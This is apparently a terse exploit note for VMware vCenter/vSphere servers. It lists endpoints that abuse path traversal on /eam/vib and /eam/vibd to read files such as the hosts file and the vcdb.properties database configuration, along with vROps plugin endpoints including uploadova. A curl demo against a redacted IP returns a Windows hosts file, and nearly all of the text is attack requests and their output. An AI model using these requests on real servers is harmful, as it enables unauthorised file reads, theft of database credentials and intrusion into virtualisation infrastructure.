
- /vsphere-client/?csp
- /eam/vib?id=C:\\Windows\\System32\\drivers\\etc\\hosts
- /eam/vib?id=/etc/hosts
- /eam/vibd?id=/etc/hosts
- /eam/vibd?id=C:\\ProgramData\\VMware\\vCenterServer\\cfg\\vmware-vpx\\vcdb.properties
- /ui/vropspluginui/rest/services/checkmobregister
- /ui/vropspluginui/rest/services/uploadova


### Demo
```
$ curl -ik https://10.x.y.z/vsphere-client/?csp
HTTP/1.1 200 OK
Server: Apache-Coyote/1.1
Set-Cookie: JSESSIONID=CB600A5211B6C4B056FAFCFB86DEBDC805C0; Path=/vsphere-client/; Secure; HttpOnly
X-UA-Compatible: IE=edge
X-Frame-Options: SAMEORIGIN
Cache-Control: no-cache, no-store, must-revalidate
Pragma: no-cache
Expires: Thu, 01 Jan 1970 00:00:00 GMT
Content-Type: text/html;charset=utf-8
Content-Length: 7650
Date: Wed, 24 Feb 2021 06:09:04 GMT


curl -ik https://10.x.y.z/eam/vib?id=C:\\Windows\\System32\\drivers\\etc\\hosts
HTTP/1.1 200 OK
Transfer-Encoding: chunked
Date: Wed, 24 Feb 2021 05:55:37 GMT
Server: Apache

# Copyright (c) 1993-2009 Microsoft Corp.
#
# This is a sample HOSTS file used by Microsoft TCP/IP for Windows.
```


### Ref
- https://twitter.com/jas502n/status/1316992409088094209
- 
